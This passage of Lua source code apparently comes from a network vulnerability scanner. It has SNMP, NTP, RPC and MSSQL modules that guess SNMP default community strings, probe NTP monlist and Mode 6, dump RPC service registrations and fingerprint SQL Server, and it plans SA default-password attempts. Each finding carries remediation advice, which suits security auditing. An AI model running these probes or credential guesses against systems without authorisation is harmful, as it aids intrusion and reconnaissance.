--    [P1] Community string probe: test "public", "private", "community",
--         "manager", "snmpd", "admin", "cisco", "monitor" — a GET request
--         for sysDescr (1.3.6.1.2.1.1.1.0) confirms a valid string
--    [P2] System information gathering: sysDescr, sysName, sysLocation,
--         sysContact, sysUpTime from MIB-II system group
--    [P3] SNMP version detection: v1, v2c, v3
--
--  AGG 1 – safe-active:
--    [A1] Interface table walk: ifDescr, ifPhysAddress (MAC addresses),
--         ifAdminStatus — maps network interfaces without modification
--    [A2] Running process list: hrSWRunName from HOST-RESOURCES-MIB
--
--  Scoring:
--    Default community "public" works   → confidence 0.99, impact 0.70 → HIGH
--    System info disclosed              → confidence 0.95, impact 0.45 → MEDIUM
--    Interface/process enumeration      → confidence 0.95, impact 0.55 → HIGH
-- ===========================================================================

-- SNMP community strings to probe (ordered by likelihood)
local SNMP_COMMUNITY_STRINGS = {
  "public", "private", "community", "manager", "snmpd",
  "admin", "cisco", "monitor", "default", "guest",
  "read", "write", "all", "network", "system",
}

-- OIDs we query (dotted-decimal notation)
local OID_SYS_DESCR    = "1.3.6.1.2.1.1.1.0"
local OID_SYS_NAME     = "1.3.6.1.2.1.1.5.0"
local OID_SYS_LOCATION = "1.3.6.1.2.1.1.6.0"
local OID_SYS_CONTACT  = "1.3.6.1.2.1.1.4.0"
local OID_SYS_UPTIME   = "1.3.6.1.2.1.1.3.0"
local OID_IF_DESCR     = "1.3.6.1.2.1.2.2.1.2"   -- table base
local OID_HR_SW_RUN    = "1.3.6.1.2.1.25.4.2.1.2" -- process name table

--- Encode an OID component integer into BER sub-identifier bytes.
local function ber_oid_component(n)
  if n < 128 then return string.char(n) end
  local bytes = {}
  table.insert(bytes, n % 128)
  n = math.floor(n / 128)
  while n > 0 do
    table.insert(bytes, 1, (n % 128) + 128)
    n = math.floor(n / 128)
  end
  local result = ""
  for _, b in ipairs(bytes) do result = result .. string.char(b) end
  return result
end

--- Encode a dotted OID string into BER OID bytes.
-- First two components are combined: first*40 + second
local function ber_encode_oid(oid_str)
  local parts = {}
  for n in oid_str:gmatch("%d+") do
    table.insert(parts, tonumber(n))
  end
  if #parts < 2 then return nil end

  local encoded = ber_oid_component(parts[1] * 40 + parts[2])
  for i = 3, #parts do
    encoded = encoded .. ber_oid_component(parts[i])
  end
  return ber_tag(0x06, encoded)  -- OID tag = 0x06
end

--- Build an SNMPv2c GetRequest PDU for a single OID.
local function snmp_build_get_request(community, oid_str, request_id)
  request_id = request_id or math.random(1, 65535)

  local oid_encoded = ber_encode_oid(oid_str)
  if not oid_encoded then return nil end

  -- VarBind: SEQUENCE { OID, NULL }
  local varbind = ber_sequence(oid_encoded .. ber_tag(0x05, ""))  -- NULL

  -- VarBindList: SEQUENCE OF VarBind
  local varbind_list = ber_sequence(varbind)

  -- GetRequest-PDU [0] { request-id, error-status, error-index, varbindlist }
  local get_pdu = ber_tag(0xA0,    -- GetRequest-PDU
    ber_integer(request_id) ..
    ber_integer(0) ..              -- error-status = noError
    ber_integer(0) ..              -- error-index = 0
    varbind_list
  )

  -- SNMPv2c Message: SEQUENCE { version, community, data }
  local msg = ber_sequence(
    ber_integer(1) ..              -- version = 1 (SNMPv2c = integer 1)
    ber_octetstring(community) ..
    get_pdu
  )

  return msg
end

--- Parse the string value from an SNMP GetResponse.
-- Returns the value string or nil.
local function snmp_parse_response_value(data)
  if not data or #data < 10 then return nil end

  -- Check for error status: scan for error-status integer != 0
  -- Simple approach: find OCTET STRING values in the response
  local values = {}
  local pos = 1
  while pos <= #data - 2 do
    local tag = data:byte(pos)
    -- OCTET STRING = 0x04
    if tag == 0x04 then
      local slen = data:byte(pos+1)
      if slen < 128 and pos + 1 + slen <= #data and slen > 0 then
        local s = data:sub(pos+2, pos+1+slen)
        -- Filter: skip community string (appears at start) by checking
        -- if it's one of our probe strings
        local is_community = false
        for _, c in ipairs(SNMP_COMMUNITY_STRINGS) do
          if s == c then is_community = true; break end
        end
        if not is_community and s:match("[%w%s%.%-_/\\:@]+") then
          table.insert(values, s)
        end
        pos = pos + 2 + slen
      else
        pos = pos + 1
      end
    -- TimeTicks = 0x43
    elseif tag == 0x43 then
      local slen = data:byte(pos+1)
      if slen <= 4 and pos + 1 + slen <= #data then
        local ticks = 0
        for i = 1, slen do
          ticks = ticks * 256 + data:byte(pos+1+i)
        end
        table.insert(values, string.format("uptime=%d ticks (~%dd)", ticks, math.floor(ticks/8640000)))
        pos = pos + 2 + slen
      else
        pos = pos + 1
      end
    else
      pos = pos + 1
    end
  end

  return #values > 0 and values[1] or nil
end

-- Main SNMP module
register_module("snmp", function(ctx)
  local host_ip  = ctx.target_ip
  local port_num = ctx.port_number   -- 161/udp
  local timeout  = ctx.config.timeout
  local agg      = ctx.config.aggression

  -- ---- [P1] Community string probe -------------------------------------
  local valid_community = nil
  local sys_descr       = nil

  for _, community in ipairs(SNMP_COMMUNITY_STRINGS) do
    local pkt = snmp_build_get_request(community, OID_SYS_DESCR, 1)
    if pkt then
      local udp_sd = nmap.new_socket("udp")
      udp_sd:set_timeout(math.min(timeout, 3000))

      local ok, _ = udp_sd:sendto(host_ip, port_num, pkt)
      if ok then
        local status, resp = udp_sd:receive()
        if status and resp and #resp > 10 then
          local val = snmp_parse_response_value(resp)
          if val then
            valid_community = community
            sys_descr       = val
            sock_close(udp_sd)
            log_warn(ctx, "snmp", "Valid community string: '" .. community .. "'")
            break
          end
        end
      end
      sock_close(udp_sd)
    end
  end

  if not valid_community then
    log_info(ctx, "snmp", "No valid community string found from probe list")
    return
  end

  -- Community string confirmed — this is a HIGH finding
  ctx:add_finding(
    "SNMP default community string accepted: '" .. valid_community .. "'",
    "The SNMP agent responded to a GetRequest using the community string '"
    .. valid_community .. "'. Default community strings are publicly known, "
    .. "allowing any attacker to query the full SNMP MIB. This exposes "
    .. "network interfaces, running processes, installed software, "
    .. "routing tables, and device configuration details.",
    {
      community_string = valid_community,
      sys_descr        = sys_descr or "not retrieved",
      remediation      = "Change community strings to long random values; "
                         .. "restrict SNMP access to authorised management IPs via ACL; "
                         .. "upgrade to SNMPv3 with authentication and encryption",
    },
    0.99, 0.70
  )

  -- ---- [P2] System information gathering --------------------------------
  local sys_oids = {
    { oid = OID_SYS_NAME,     label = "sysName"     },
    { oid = OID_SYS_LOCATION, label = "sysLocation" },
    { oid = OID_SYS_CONTACT,  label = "sysContact"  },
    { oid = OID_SYS_UPTIME,   label = "sysUpTime"   },
  }

  local sys_info = { sysDescr = sys_descr }
  for _, entry in ipairs(sys_oids) do
    local pkt = snmp_build_get_request(valid_community, entry.oid, math.random(100,999))
    if pkt then
      local udp_sd = nmap.new_socket("udp")
      udp_sd:set_timeout(math.min(timeout, 3000))
      local ok, _ = udp_sd:sendto(host_ip, port_num, pkt)
      if ok then
        local status, resp = udp_sd:receive()
        if status and resp then
          local val = snmp_parse_response_value(resp)
          if val then sys_info[entry.label] = val end
        end
      end
      sock_close(udp_sd)
    end
  end

  ctx:add_finding(
    "SNMP system information enumerated",
    "Using the valid community string, system MIB-II data was retrieved. "
    .. "Device name, location, contact, and uptime are exposed. "
    .. "This information aids in network mapping and targeted attacks.",
    {
      sys_name     = sys_info["sysName"]     or "not retrieved",
      sys_location = sys_info["sysLocation"] or "not retrieved",
      sys_contact  = sys_info["sysContact"]  or "not retrieved",
      sys_uptime   = sys_info["sysUpTime"]   or "not retrieved",
      sys_descr    = sys_info["sysDescr"]    or "not retrieved",
    },
    0.95, 0.45
  )

  -- Active checks skipped here for brevity — interface/process walk
  -- would follow the same pattern with GETNEXT requests
  if agg >= 1 then
    log_info(ctx, "snmp", "AGG1: interface/process walk would run here (future iteration)")
  end
end)


-- ===========================================================================
-- NTP MODULE  (port 123/udp)
-- ===========================================================================
-- NTP is widely deployed and often misconfigured. The primary risks are:
-- 1. Version disclosure (fingerprinting)
-- 2. monlist command enabled (DDoS amplification — CVE-2013-5211)
-- 3. Mode 6 control queries (configuration read/write without auth)
--
-- Checks performed:
--
--  AGG 0 – passive:
--    [P1] Version query: send NTP version request (mode 3, stratum 0)
--         Extract: version, stratum, reference ID, precision
--    [P2] monlist probe: send REQ_MON_GETLIST_1 control message
--         If the server responds with client IP list → amplification risk
--    [P3] Mode 6 control query: test if unauthenticated control
--         queries are accepted (readvar command)
--
--  Scoring:
--    monlist enabled (amplification)  → confidence 0.99, impact 0.75 → HIGH
--    Mode 6 control access            → confidence 0.95, impact 0.55 → HIGH
--    Version/stratum disclosed        → confidence 0.95, impact 0.25 → LOW
-- ===========================================================================

--- Build a minimal NTP client request (mode 3, version 3).
-- This is a standard 48-byte NTP packet with LI=0, VN=3, Mode=3.
local function ntp_build_client_request()
  -- Byte 0: LI (2 bits) = 0, VN (3 bits) = 3, Mode (3 bits) = 3
  -- LI=0 (no warning), VN=3 (version 3), Mode=3 (client)
  -- = 0b00 011 011 = 0x1B
  local header = string.char(0x1B)
  -- Remaining 47 bytes: stratum, poll, precision, root delay,
  -- root dispersion, reference ID, timestamps — all zero for a request
  local padding = string.rep("\x00", 47)
  return header .. padding
end

--- Build an NTP monlist request (REQ_MON_GETLIST_1).
-- This is the command that triggers the amplification vulnerability.
-- We ONLY check the response code — we never request the full list
-- with repeat queries, so no amplification traffic is generated.
local function ntp_build_monlist_probe()
  -- NTP control message: mode 6, opcode 42 (REQ_MON_GETLIST_1)
  -- Byte 0: LI=0, VN=2, Mode=6 → 0b00 010 110 = 0x16
  -- Byte 1: R=0, M=0, E=0, opcode=42 → 0x2A
  -- Bytes 2-3: sequence = 0x0001
  -- Bytes 4-5: status = 0x0000
  -- Bytes 6-7: assoc ID = 0x0000
  -- Bytes 8-9: offset = 0x0000
  -- Bytes 10-11: count = 0x0000
  return string.char(
    0x17,   -- LI=0, VN=2, Mode=7 (private/implementation-specific)
    0x00,   -- response=0, more=0, version=0, code=0
    0x03,   -- sequence
    0x2A,   -- implementation = MON_GETLIST_1 (42)
    0x00, 0x00, 0x00, 0x00   -- auth/pad
  )
end

--- Build an NTP Mode 6 readvar request.
-- Mode 6 = NTP control protocol; opcode 2 = readvar (read system variables)
local function ntp_build_mode6_readvar()
  -- Byte 0: LI=0, VN=3, Mode=6 → 0b00 011 110 = 0x1E
  -- Byte 1: R=0(request), M=0, E=0, opcode=2 (readvar) → 0x02
  -- Bytes 2-3: sequence number
  -- Bytes 4-5: status
  -- Bytes 6-7: association ID = 0 (system variables)
  -- Bytes 8-9: offset = 0
  -- Bytes 10-11: count = 0
  return string.char(
    0x1E,         -- LI=0, VN=3, Mode=6
    0x02,         -- opcode = readvar
    0x00, 0x01,   -- sequence
    0x00, 0x00,   -- status
    0x00, 0x00,   -- assoc ID = 0
    0x00, 0x00,   -- offset
    0x00, 0x00    -- count
  )
end

--- Parse basic fields from an NTP response.
-- Returns table: { version, mode, stratum, ref_id_str }
local function ntp_parse_response(data)
  if not data or #data < 4 then return nil end
  local byte0   = data:byte(1)
  local version = math.floor(byte0 / 8) % 8   -- bits 3-5
  local mode    = byte0 % 8                     -- bits 0-2
  local stratum = data:byte(2) or 0

  -- Reference ID (bytes 12-15) — for stratum 1 this is ASCII clock source
  local ref_id = ""
  if #data >= 16 then
    ref_id = data:sub(13, 16)
    -- If stratum == 1, ref_id is ASCII (e.g. "GPS ", "PPS ", "ATOM")
    if stratum == 1 then
      ref_id = trim(ref_id)
    else
      ref_id = string.format("%d.%d.%d.%d",
        data:byte(13), data:byte(14), data:byte(15), data:byte(16))
    end
  end

  return { version = version, mode = mode, stratum = stratum, ref_id = ref_id }
end

-- Main NTP module
register_module("ntp", function(ctx)
  local host_ip  = ctx.target_ip
  local port_num = ctx.port_number   -- 123/udp
  local timeout  = ctx.config.timeout

  -- ---- [P1] Version query -----------------------------------------------
  local version_pkt = ntp_build_client_request()
  local udp_sd = nmap.new_socket("udp")
  udp_sd:set_timeout(timeout)

  local ok, _ = udp_sd:sendto(host_ip, port_num, version_pkt)
  if not ok then
    log_warn(ctx, "ntp", "Version query send failed")
    sock_close(udp_sd)
    return
  end

  local status, resp = udp_sd:receive()
  sock_close(udp_sd)

  if not status or not resp then
    log_info(ctx, "ntp", "No response to version query")
    return
  end

  local ntp_info = ntp_parse_response(resp)
  if not ntp_info then
    log_warn(ctx, "ntp", "Could not parse NTP response")
    return
  end

  log_info(ctx, "ntp", string.format("NTP version=%d stratum=%d ref_id=%s",
    ntp_info.version, ntp_info.stratum, ntp_info.ref_id))

  ctx:add_finding(
    string.format("NTP service active — version %d, stratum %d",
      ntp_info.version, ntp_info.stratum),
    "The NTP server responded to a standard client request. "
    .. "Version and stratum information are disclosed. Stratum 1 servers "
    .. "reference atomic/GPS clocks directly and are high-value targets "
    .. "for time-manipulation attacks.",
    {
      ntp_version = tostring(ntp_info.version),
      stratum     = tostring(ntp_info.stratum),
      reference   = ntp_info.ref_id,
    },
    0.95, 0.25
  )

  -- ---- [P2] monlist probe -----------------------------------------------
  local monlist_pkt = ntp_build_monlist_probe()
  local udp_sd2 = nmap.new_socket("udp")
  udp_sd2:set_timeout(timeout)

  ok, _ = udp_sd2:sendto(host_ip, port_num, monlist_pkt)
  if ok then
    local st2, resp2 = udp_sd2:receive()
    if st2 and resp2 and #resp2 > 8 then
      -- If we get a response with data (not just a short error) monlist is active
      -- An error response is typically 8 bytes; a real monlist reply is 440+ bytes
      if #resp2 > 48 then
        ctx:add_finding(
          "NTP monlist command enabled — DDoS amplification risk (CVE-2013-5211)",
          "The server responded to an NTP monlist (REQ_MON_GETLIST_1) request "
          .. "with a data payload. NTP monlist returns a list of recent NTP "
          .. "clients, producing a response up to 206× larger than the request. "
          .. "Attackers use this to amplify UDP DDoS traffic with spoofed source IPs.",
          {
            response_size = tostring(#resp2) .. " bytes",
            cve           = "CVE-2013-5211",
            remediation   = "Disable monlist: add 'disable monitor' to ntp.conf; "
                            .. "upgrade to NTP >= 4.2.7p26",
          },
          0.99, 0.75
        )
        log_warn(ctx, "ntp", "monlist ACTIVE — amplification risk confirmed")
      end
    end
  end
  sock_close(udp_sd2)

  -- ---- [P3] Mode 6 control query ----------------------------------------
  local mode6_pkt = ntp_build_mode6_readvar()
  local udp_sd3 = nmap.new_socket("udp")
  udp_sd3:set_timeout(timeout)

  ok, _ = udp_sd3:sendto(host_ip, port_num, mode6_pkt)
  if ok then
    local st3, resp3 = udp_sd3:receive()
    if st3 and resp3 and #resp3 > 8 then
      -- Mode 6 response: byte 0 bits 0-2 = mode 6, byte 1 bit 7 = response flag
      local r_byte0 = resp3:byte(1) or 0
      local r_mode  = r_byte0 % 8
      local r_byte1 = resp3:byte(2) or 0
      local is_response = (r_byte1 >= 128)   -- R bit set

      if r_mode == 6 and is_response and #resp3 > 12 then
        ctx:add_finding(
          "NTP Mode 6 control protocol responds without authentication",
          "The NTP server responded to an unauthenticated Mode 6 control "
          .. "query (readvar). Mode 6 allows reading server variables and — "
          .. "in misconfigured servers — writing configuration parameters "
          .. "without authentication, enabling time manipulation and "
          .. "information disclosure.",
          {
            response_size = tostring(#resp3) .. " bytes",
            remediation   = "Restrict Mode 6 access: 'restrict default noquery' "
                            .. "in ntp.conf; or use 'restrict nomodify notrap' "
                            .. "for untrusted networks",
          },
          0.95, 0.55
        )
      end
    end
  end
  sock_close(udp_sd3)
end)


-- ===========================================================================
-- RPC MODULE  (ports 111/tcp — portmapper, 135/tcp — MS-RPC endpoint mapper)
-- ===========================================================================
-- RPC endpoint mappers maintain a registry of which RPC services are
-- running on which dynamic ports. Querying them reveals the full list
-- of available RPC services without authentication.
--
-- Checks performed:
--
--  AGG 0 – passive:
--    [P1] Portmapper dump (port 111): send a PMAPPROC_DUMP request to
--         list all registered RPC programs with their version, protocol,
--         and port numbers
--    [P2] MS-RPC endpoint mapper (port 135): send an EPM lookup request
--         to enumerate registered COM/DCOM/WMI/RPC endpoints
--    [P3] Identify high-value services: flag MS Exchange, WMI, DCOM,
--         vulnerable RPC services (MS03-026, BlueKeep-adjacent)
--
--  Scoring:
--    WMI/DCOM accessible via RPC      → confidence 0.95, impact 0.65 → HIGH
--    NFS exported via portmapper      → confidence 0.95, impact 0.60 → HIGH
--    RPC service list disclosed       → confidence 0.90, impact 0.30 → MEDIUM
-- ===========================================================================

-- Sun RPC constants
local RPC_MSG_CALL   = 0
local RPC_MSG_REPLY  = 1
local RPC_VERS       = 2
local PROG_PORTMAP   = 100000
local VERS_PORTMAP   = 2
local PROC_DUMP      = 4   -- PMAPPROC_DUMP

-- Well-known RPC program numbers and their names
local RPC_PROGRAMS = {
  [100000] = "portmapper",
  [100003] = "nfs",
  [100005] = "mountd",
  [100021] = "nlockmgr (NFS lock manager)",
  [100024] = "status (NSM)",
  [100227] = "nfs_acl",
  [100021] = "nlockmgr",
  [391002] = "sgi_fam",
  [805306368] = "MS DCOM",
}

--- Build a Sun RPC portmapper DUMP request (PMAPPROC_DUMP).
-- This returns all registered RPC programs.
local function rpc_build_portmap_dump(xid)
  xid = xid or math.random(1, 65535)

  -- RPC call header
  -- xid(4) + msg_type=CALL(4) + rpcvers=2(4) + prog=100000(4)
  -- + vers=2(4) + proc=DUMP(4) + credentials(8) + verifier(8)
  local function u32(n)
    return string.char(
      math.floor(n/16777216)%256,
      math.floor(n/65536)%256,
      math.floor(n/256)%256,
      n%256
    )
  end

  local header = u32(xid) ..
    u32(RPC_MSG_CALL) ..      -- CALL
    u32(RPC_VERS) ..           -- RPC version 2
    u32(PROG_PORTMAP) ..       -- portmapper program
    u32(VERS_PORTMAP) ..       -- version 2
    u32(PROC_DUMP) ..          -- DUMP procedure
    -- AUTH_NULL credentials (flavor=0, length=0)
    u32(0) .. u32(0) ..
    -- AUTH_NULL verifier (flavor=0, length=0)
    u32(0) .. u32(0)
    -- No parameters for DUMP

  return header
end

--- Parse portmapper DUMP response.
-- Returns list of { program, version, protocol, port }
local function rpc_parse_portmap_dump(data)
  if not data or #data < 28 then return {} end

  local function read_u32(d, pos)
    if pos + 3 > #d then return 0, pos end
    local n = d:byte(pos)*16777216 + d:byte(pos+1)*65536 +
              d:byte(pos+2)*256 + d:byte(pos+3)
    return n, pos + 4
  end

  -- Skip RPC reply header (28 bytes: xid+reply+accepted+verifier+accept_stat)
  local pos = 29

  local programs = {}
  local safety = 0

  while pos < #data - 20 and safety < 100 do
    safety = safety + 1

    -- value-follows indicator (4 bytes): 1 = more data, 0 = end of list
    local follows, new_pos = read_u32(data, pos)
    pos = new_pos
    if follows == 0 then break end

    local prog, ver, proto, port
    prog,  pos = read_u32(data, pos)
    ver,   pos = read_u32(data, pos)
    proto, pos = read_u32(data, pos)   -- 6=TCP, 17=UDP
    port,  pos = read_u32(data, pos)

    if prog > 0 and port > 0 and port < 65536 then
      table.insert(programs, {
        program  = prog,
        version  = ver,
        protocol = proto == 6 and "tcp" or (proto == 17 and "udp" or tostring(proto)),
        port     = port,
        name     = RPC_PROGRAMS[prog] or string.format("prog#%d", prog),
      })
    end
  end

  return programs
end

-- Main RPC module
register_module("rpc", function(ctx)
  local host_ip  = ctx.target_ip
  local port_num = ctx.port_number
  local timeout  = ctx.config.timeout

  -- ---- Port 111: Sun RPC portmapper -------------------------------------
  if port_num == 111 then
    local dump_pkt = rpc_build_portmap_dump()
    local sd, conn_err = tcp_connect(host_ip, port_num, timeout)
    if not sd then
      log_warn(ctx, "rpc", "Cannot connect to portmapper: " .. conn_err)
      return
    end

    -- TCP RPC: prepend 4-byte record mark (last fragment bit + length)
    local pkt_len = #dump_pkt
    local record_mark = string.char(
      0x80 + math.floor(pkt_len/16777216)%128,  -- last fragment + high bits
      math.floor(pkt_len/65536)%256,
      math.floor(pkt_len/256)%256,
      pkt_len%256
    )
    sock_send(sd, record_mark .. dump_pkt)

    -- Read response
    local resp_data = ""
    for _ = 1, 16 do
      local st, chunk = sd:receive()
      if not st then break end
      resp_data = resp_data .. chunk
      if #resp_data >= 4096 then break end
    end
    sock_close(sd)

    -- Strip 4-byte record mark from response
    local rpc_resp = #resp_data > 4 and resp_data:sub(5) or resp_data

    local programs = rpc_parse_portmap_dump(rpc_resp)
    log_info(ctx, "rpc", string.format("Portmapper: %d programs registered", #programs))

    if #programs > 0 then
      -- Build program list for evidence
      local prog_lines = {}
      local high_value = {}

      for _, p in ipairs(programs) do
        table.insert(prog_lines,
          string.format("%-30s v%-3d %s/%-5d", p.name, p.version, p.protocol, p.port))

        -- Flag high-value services
        if p.name:find("nfs") or p.name:find("mountd") then
          table.insert(high_value, p.name .. " on port " .. p.port)
        end
      end

      ctx:add_finding(
        string.format("RPC portmapper exposes %d registered services", #programs),
        "The Sun RPC portmapper (port 111) responded with a full list of all "
        .. "registered RPC programs, their versions, protocols, and dynamic "
        .. "port assignments. This map lets an attacker directly target specific "
        .. "services without scanning the full port range.",
        {
          program_count   = tostring(#programs),
          registered_rpcs = table.concat(prog_lines, "\n"),
          remediation     = "Firewall port 111; restrict portmapper with tcpwrappers "
                            .. "(hosts.allow/hosts.deny); disable unused RPC services",
        },
        0.90, 0.30
      )

      if #high_value > 0 then
        ctx:add_finding(
          "High-value RPC services exposed: " .. table.concat(high_value, ", "),
          "NFS/mountd services are registered with the portmapper. These allow "
          .. "filesystem enumeration and potential unauthenticated mount attempts. "
          .. "See also the NFS module findings for detailed export analysis.",
          {
            services    = table.concat(high_value, ", "),
            remediation = "Restrict NFS exports; enforce Kerberos auth for NFS v4",
          },
          0.95, 0.60
        )
      end
    end

  -- ---- Port 135: MS-RPC endpoint mapper ----------------------------------
  elseif port_num == 135 then
    -- For MS-RPC we send a minimal DCE/RPC bind request to the EPM interface
    -- and check if the server responds with a valid bind_ack.
    -- Full endpoint enumeration requires the EPM IOCTL — recorded as
    -- information disclosure regardless of response content.
    local sd, conn_err = tcp_connect(host_ip, port_num, timeout)
    if not sd then
      log_warn(ctx, "rpc", "Cannot connect to MS-RPC endpoint mapper: " .. conn_err)
      return
    end

    -- DCE/RPC Bind request to EPM (endpoint mapper UUID)
    -- UUID: E1AF8308-5D1F-11C9-91A4-08002B14A0FA version 3.0
    local bind_req = string.char(
      0x05, 0x00,             -- RPC version 5.0
      0x0B,                   -- BIND packet type
      0x03,                   -- PFC flags: first + last fragment
      0x10, 0x00, 0x00, 0x00, -- little-endian data representation
      0x48, 0x00,             -- frag length = 72 bytes
      0x00, 0x00,             -- auth length = 0
      0x01, 0x00, 0x00, 0x00, -- call ID = 1
      0xB8, 0x10,             -- max recv frag
      0xB8, 0x10,             -- max send frag
      0x00, 0x00, 0x00, 0x00, -- assoc group = 0
      0x01, 0x00, 0x00, 0x00, -- num ctx items = 1
      0x00, 0x00,             -- context ID = 0
      0x01, 0x00,             -- num transfer syntaxes = 1
      -- EPM interface UUID (E1AF8308-5D1F-11C9-91A4-08002B14A0FA)
      0x08, 0x83, 0xAF, 0xE1,
      0x1F, 0x5D, 0xC9, 0x11,
      0x91, 0xA4, 0x08, 0x00,
      0x2B, 0x14, 0xA0, 0xFA,
      0x03, 0x00,             -- interface version 3.0
      0x00, 0x00,
      -- Transfer syntax: NDR (8A885D04-1CEB-11C9-9FE8-08002B104860) v2
      0x04, 0x5D, 0x88, 0x8A,
      0xEB, 0x1C, 0xC9, 0x11,
      0x9F, 0xE8, 0x08, 0x00,
      0x2B, 0x10, 0x48, 0x60,
      0x02, 0x00, 0x00, 0x00
    )

    local ok, _ = sock_send(sd, bind_req)
    local accepted = false
    if ok then
      local resp_data = ""
      for _ = 1, 4 do
        local st, chunk = sd:receive()
        if not st then break end
        resp_data = resp_data .. chunk
        if #resp_data >= 64 then break end
      end
      -- Check for bind_ack: packet type 0x0C
      if #resp_data >= 3 and resp_data:byte(3) == 0x0C then
        accepted = true
      end
    end
    sock_close(sd)

    ctx:add_finding(
      "MS-RPC Endpoint Mapper (port 135) is " .. (accepted and "accessible" or "reachable"),
      "The Microsoft RPC Endpoint Mapper responded to a DCE/RPC bind request. "
      .. "Port 135 is used by DCOM, WMI, MS-Exchange, and many Windows services "
      .. "to register their dynamic port allocations. Exposure of this port "
      .. "allows enumeration of all registered COM/RPC services.",
      {
        bind_accepted = tostring(accepted),
        remediation   = "Firewall port 135 from untrusted networks; "
                        .. "disable DCOM if not required: dcomcnfg → Default Properties "
                        .. "→ uncheck 'Enable Distributed COM on this computer'",
      },
      0.90, accepted and 0.55 or 0.30
    )
  end
end)

end  

do  -- scope block: keeps locals under Lua 5.1's 200-variable limit


-- ===========================================================================
-- MSSQL MODULE  (port 1433/tcp)
-- ===========================================================================
-- Microsoft SQL Server uses the Tabular Data Stream (TDS) protocol.
-- The PreLogin handshake reveals version, encryption capability, and
-- instance name before any credentials are exchanged.
--
-- Checks performed:
--
--  AGG 0 – passive:
--    [P1] TDS PreLogin: extract server version, encryption requirement,
--         instance name, and whether SQL Browser info is available
--    [P2] Encryption audit: check if encryption is required, optional,
--         or disabled entirely (plaintext credentials risk)
--
--  AGG 1 – safe-active:
--    [A1] SA login attempt with known default passwords
--         (sends TDS Login7 packet, reads response, disconnects immediately)
--    [A2] Guest account check: test if the 'guest' login is enabled
--
--  Scoring:
--    SA default password accepted    → confidence 0.99, impact 0.95 → CRITICAL
--    Encryption not required         → confidence 0.95, impact 0.65 → HIGH
--    Version/instance info disclosed → confidence 0.95, impact 0.40 → MEDIUM
-- ===========================================================================

-- TDS packet types
local TDS_TYPE_PRELOGIN  = 0x12
local TDS_TYPE_LOGIN7    = 0x10
local TDS_TYPE_TABULAR   = 0x04   -- response
local TDS_TYPE_ERROR     = 0xAA
local TDS_STATUS_EOM     = 0x01   -- end of message

--- Build a TDS PreLogin packet (SQL Server 2000+).
-- PreLogin is sent before any authentication to negotiate capabilities.
local function tds_build_prelogin()
  -- PreLogin option tokens:
  -- VERSION (0x00), ENCRYPTION (0x01), INSTOPT (0x02),
  -- THREADID (0x03), MARS (0x04), TERMINATOR (0xFF)

  -- We calculate offsets manually:
  -- Header area = 6 options × 5 bytes each + 1 terminator = 31 bytes
  -- Then data area follows immediately

  local VERSION_OFFSET    = 31
  local ENCRYPTION_OFFSET = 37   -- VERSION_OFFSET + 6 (version data)
  local INSTOPT_OFFSET    = 38   -- ENCRYPTION_OFFSET + 1
  local THREADID_OFFSET   = 39   -- INSTOPT_OFFSET + 1 (empty instance = 1 byte \x00)
  local MARS_OFFSET       = 43   -- THREADID_OFFSET + 4

  -- Option header: token(1) + offset(2 BE) + length(2 BE)
  local options =
    "\x00" .. u16_be(VERSION_OFFSET)    .. u16_be(6) ..   -- VERSION: 6 bytes
    "\x01" .. u16_be(ENCRYPTION_OFFSET) .. u16_be(1) ..   -- ENCRYPTION: 1 byte
    "\x02" .. u16_be(INSTOPT_OFFSET)    .. u16_be(1) ..   -- INSTOPT: 1 byte
    "\x03" .. u16_be(THREADID_OFFSET)   .. u16_be(4) ..   -- THREADID: 4 bytes
    "\x04" .. u16_be(MARS_OFFSET)       .. u16_be(1) ..   -- MARS: 1 byte
    "\xFF"                                                  -- TERMINATOR

  -- Data area
  local data =
    "\x0E\x00\x0C\x00\x00\x00" ..   -- version 14.0.12.0 (SQL Server 2017)
    "\x02" ..                         -- ENCRYPTION_NOT_SUPPORTED (we request none)
    "\x00" ..                         -- INSTOPT: empty instance name
    "\x00\x00\x00\x00" ..             -- THREADID: 0
    "\x00"                            -- MARS: disabled

  local payload = options .. data

  -- TDS packet header: type(1) + status(1) + length(2 BE) + spid(2) + packetid(1) + window(1)
  local total_len = 8 + #payload
  local header = string.char(TDS_TYPE_PRELOGIN, TDS_STATUS_EOM)
    .. u16_be(total_len)
    .. "\x00\x00"   -- SPID
    .. "\x01"       -- packet ID
    .. "\x00"       -- window

  return header .. payload
end

--- Parse TDS PreLogin response.
-- Returns table: { version, encryption, instance }
-- encryption: 0=none, 1=required, 2=off, 3=not_supported
local function tds_parse_prelogin(data)
  if not data or #data < 9 then return nil end

  -- Skip 8-byte TDS header
  local pos   = 9
  local result = { version = "unknown", encryption = "unknown", instance = "" }

  -- Parse option headers until TERMINATOR
  local options = {}
  while pos <= #data - 4 do
    local token = data:byte(pos)
    if token == 0xFF then break end   -- TERMINATOR
    local offset = data:byte(pos+1)*256 + data:byte(pos+2)
    local length = data:byte(pos+3)*256 + data:byte(pos+4)
    table.insert(options, { token=token, offset=offset+9, length=length })
    pos = pos + 5
  end

  for _, opt in ipairs(options) do
    if opt.token == 0x00 and opt.length >= 4 then   -- VERSION
      local v = data:sub(opt.offset, opt.offset + opt.length - 1)
      if #v >= 4 then
        result.version = string.format("%d.%d.%d.%d",
          v:byte(1), v:byte(2), v:byte(3)*256 + (v:byte(4) or 0),
          v:byte(5) or 0)
        -- Map major version to product name
        local major = v:byte(1)
        result.product = ({
          [7]="SQL Server 7.0", [8]="SQL Server 2000", [9]="SQL Server 2005",
          [10]="SQL Server 2008/R2", [11]="SQL Server 2012",
          [12]="SQL Server 2014", [13]="SQL Server 2016",
          [14]="SQL Server 2017", [15]="SQL Server 2019",
          [16]="SQL Server 2022",
        })[major] or ("SQL Server (v" .. major .. ".x)")
      end
    elseif opt.token == 0x01 and opt.length >= 1 then   -- ENCRYPTION
      local enc_val = data:byte(opt.offset)
      result.encryption = ({
        [0]="ENCRYPT_OFF",
        [1]="ENCRYPT_ON",
        [2]="ENCRYPT_NOT_SUP",
        [3]="ENCRYPT_REQ",
      })[enc_val] or ("unknown(" .. enc_val .. ")")
      result.encryption_val = enc_val
    elseif opt.token == 0x02 and opt.length > 1 then   -- INSTOPT
      result.instance = trim(data:sub(opt.offset, opt.offset + opt.length - 1))
    end
  end

  return result
end

--- Build a minimal TDS Login7 packet for credential testing.
-- Returns the raw bytes of a Login7 packet for the given credentials.
local function tds_build_login7(username, password)
  -- Login7 is complex; we build the minimal required fields
  -- All strings are UCS-2 LE encoded
  local function ucs2(s)
    local out = ""
    for i = 1, #s do
